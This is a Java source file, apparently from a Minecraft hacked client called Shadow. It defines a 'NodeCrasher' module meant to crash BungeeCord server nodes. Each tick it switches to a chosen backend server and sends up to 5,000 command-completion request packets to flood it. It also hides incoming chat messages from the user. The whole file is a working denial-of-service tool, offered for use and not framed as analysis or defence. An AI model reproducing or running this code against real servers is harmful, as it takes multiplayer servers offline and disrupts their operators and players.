package net.shadow.feature.module;

import net.minecraft.network.packet.c2s.play.ChatMessageC2SPacket;
import net.minecraft.network.packet.c2s.play.RequestCommandCompletionsC2SPacket;
import net.minecraft.network.packet.s2c.play.GameMessageS2CPacket;
import net.shadow.Shadow;
import net.shadow.event.events.PacketInput;
import net.shadow.feature.base.Module;
import net.shadow.feature.base.ModuleType;
import net.shadow.feature.configuration.CustomValue;
import net.shadow.feature.configuration.SliderValue;

import java.util.Random;

public class BungeeNodeCrash extends Module implements PacketInput {


    final CustomValue<String> target = this.config.create("Target Node", "smp");
    final SliderValue power = this.config.create("Power", 1000, 100, 5000, 0);

    public BungeeNodeCrash() {
        super("NodeCrasher", "crash bungee server nodes", ModuleType.CRASH);
    }

    @Override
    public void onEnable() {
        Shadow.getEventSystem().add(PacketInput.class, this);
    }

    @Override
    public void onDisable() {
        Shadow.getEventSystem().remove(PacketInput.class, this);
    }

    @Override
    public void onUpdate() {
        Random r = new Random();
        ChatMessageC2SPacket packet = new ChatMessageC2SPacket("/server " + target.getThis());
        Shadow.c.player.networkHandler.sendPacket(packet);
        for (int i = 0; i < power.getThis(); i++) {
            Shadow.c.player.networkHandler.sendPacket(new RequestCommandCompletionsC2SPacket(r.nextInt(9000), "/"));
        }
    }

    @Override
    public void onRender() {

    }

    @Override
    public void onReceivedPacket(PacketInputEvent event) {
        if (event.getPacket() instanceof GameMessageS2CPacket pack) {
            event.cancel();
        }
    }


}
